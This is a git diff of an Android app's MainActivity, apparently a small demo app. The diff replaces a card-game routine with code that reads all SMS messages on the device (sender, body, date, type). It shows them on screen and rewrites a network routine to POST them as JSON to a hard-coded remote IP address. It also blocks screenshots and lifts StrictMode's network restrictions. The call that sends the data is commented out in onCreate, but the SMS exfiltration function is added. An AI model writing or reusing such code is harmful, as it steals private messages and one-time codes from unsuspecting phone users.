@@ -1,17 +1,15 @@
 package com.example.robot.a10;
 
-import android.annotation.SuppressLint;
 import android.content.ContentResolver;
 import android.database.Cursor;
 import android.database.sqlite.SQLiteException;
 import android.net.Uri;
+import android.os.Bundle;
 import android.os.StrictMode;
 import android.support.v7.app.AppCompatActivity;
-import android.os.Bundle;
 import android.util.Log;
 import android.view.WindowManager;
-import android.webkit.WebView;
-import android.widget.Toast;
+import android.widget.TextView;
 
 import org.json.JSONObject;
 
@@ -33,34 +31,49 @@ public class MainActivity extends AppCompatActivity {
 
 
         this.getWindow().addFlags(WindowManager.LayoutParams.FLAG_SECURE);  // 禁止截屏
-
-        Pokers pokers = new Pokers();
-        Player p1 = new Player();
-        Player p2 = new Player();
-
-        for (int i = 0; i < 4; i++) {
-            p1.wantPokers(pokers.getNextPoker());
-            p2.wantPokers(pokers.getNextPoker());
+        if (android.os.Build.VERSION.SDK_INT > 9) {
+            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+            StrictMode.setThreadPolicy(policy);
         }
-        String text ="player1: " +  p1.getStatString() + "total: " + p1.getSum() + ".player2: " + p2.getStatString() + "total: " +p2.getSum();
 
-        Toast.makeText(this,text,Toast.LENGTH_SHORT).show();
+        TextView textView  = (TextView)findViewById(R.id.dick);
+        textView.setText(readSMS());
 
-
-
-//        if (android.os.Build.VERSION.SDK_INT > 9) {
-//            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
-//            StrictMode.setThreadPolicy(policy);
+//        Pokers pokers = new Pokers();
+//        Player p1 = new Player();
+//        Player p2 = new Player();
+//
+//        for (int i = 0; i < 4; i++) {
+//            p1.wantPokers(pokers.getNextPoker());
+//            p2.wantPokers(pokers.getNextPoker());
 //        }
+//        String text ="player1: " +  p1.getStatString() + "total: " + p1.getSum() + ".player2: " + p2.getStatString() + "total: " +p2.getSum();
+//
+//        Toast.makeText(this,text,Toast.LENGTH_SHORT).show();
+
+
+
+
 //
 //        try {Thread.sleep(6000);} catch (Exception e) {}
 //        Toast.makeText(this, "Fuck This World", Toast.LENGTH_SHORT).show();
 //        try {Thread.sleep(3000);} catch (Exception e) {}
-////        Toast.makeText(this, readSMS(), Toast.LENGTH_SHORT).show();
-//        Toast.makeText(this, testdata(), Toast.LENGTH_SHORT).show();
+//        Toast.makeText(this, readSMS(), Toast.LENGTH_SHORT).show();
 
+//        Toast.makeText(this, testdata(), Toast.LENGTH_SHORT).show();
+//        postData();
+//
+//        Uri num = Uri.parse("tel:13716697293");
+//        Intent calin = new Intent(Intent.ACTION_DIAL,num);
+//        startActivity(calin);
+        // active translate data
+//        Intent intent= new Intent(this,MainActivity.class);
+//        intent.putExtra("dick","dick");
+//        startActivity(intent);
 
     }
+
+
 
     public String readSMS() {
         final String SMS_URI_ALL   = "content://sms/";
@@ -97,8 +110,8 @@ public class MainActivity extends AppCompatActivity {
                     phoneNumber = cur.getString(phoneNumberColumn);
                     smsbody = cur.getString(smsbodyColumn);
 
-                    SimpleDateFormat dateFormat = new SimpleDateFormat(
-                            "yyyy-MM-dd hh:mm:ss");
+                    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
+
                     Date d = new Date(Long.parseLong(cur.getString(dateColumn)));
                     date = dateFormat.format(d);
 
@@ -117,7 +130,7 @@ public class MainActivity extends AppCompatActivity {
                     smsBuilder.append(smsbody+",");
                     smsBuilder.append(date+",");
                     smsBuilder.append(type);
-                    smsBuilder.append("] ");
+                    smsBuilder.append("]");
 
                     if(smsbody == null) smsbody = "";
                 }while(cur.moveToNext());
@@ -125,7 +138,7 @@ public class MainActivity extends AppCompatActivity {
                 smsBuilder.append("no result!");
             }
 
-            smsBuilder.append("getSmsInPhone has executed!");
+//            smsBuilder.append("getSmsInPhone has executed!");
         } catch(SQLiteException ex) {
             Log.d("SQLiteException in getSmsInPhone", ex.getMessage());
         }
@@ -196,7 +209,7 @@ public class MainActivity extends AppCompatActivity {
 
     public String testdata(){
         //String params = "{\"user_phone\":" +user_phone +",\"user_password\":" + user_password+  "}";
-        String params = "{\"username\":\"joker\",\"password\":\"fuck\"}";
+        String params = "{\"username\":\"joker\",\"password\":\"小丑\"}";
         String data = null;
         try {
             URL url=new URL("http://118.25.78.198:5000/b");
@@ -242,9 +255,11 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void run() {
                 //String params = "{\"user_phone\":" +user_phone +",\"user_password\":" + user_password+  "}";
-                String params = "{\"username\":\"joker\",\"password\":\"fuck\"}";
+                String params = "{\"username\":" + readSMS() + "}";
+//                String params = "{\"username\":\"joker\",\"password\":\"小丑\"}";
+                System.out.println(params);
                 try {
-                    URL url=new URL("http://118.25.78.198:5000/b");
+                    URL url=new URL("http://118.25.78.198:5000/bb");
                     HttpURLConnection connect=(HttpURLConnection)url.openConnection();
                     connect.setDoInput(true);
                     connect.setDoOutput(true);
@@ -265,7 +280,7 @@ public class MainActivity extends AppCompatActivity {
                             sb.append(line);
                         }
                         JSONObject reinfo = new JSONObject(sb.toString());  //字符串转json对象
-                        System.out.println(reinfo.get("info"));  //用get获取json对象的值
+                        System.out.println(reinfo.get("Me"));  //用get获取json对象的值
                         //Log.i("请求结果", reinfo.get("info").toString());
                     }
                     else {
@@ -281,3 +296,30 @@ public class MainActivity extends AppCompatActivity {
 
 
 }
+
+//
+//class MyLocationListener implements LifecycleObserver {
+//    private boolean enabled = false;
+//    public MyLocationListener(Context context, Lifecycle lifecycle, Callback callback) {
+//           ;
+//    }
+//
+//    @OnLifecycleEvent(Lifecycle.Event.ON_START)
+//    void start() {
+//        if (enabled) {
+//            // connect
+//        }
+//    }
+//
+//    public void enable() {
+//        enabled = true;
+//        if (lifecycle.getCurrentState().isAtLeast(STARTED)) {
+//            // connect if not connected
+//        }
+//    }
+//
+//    @OnLifecycleEvent(Lifecycle.Event.ON_STOP)
+//    void stop() {
+//        // disconnect if connected
+//    }
+//}
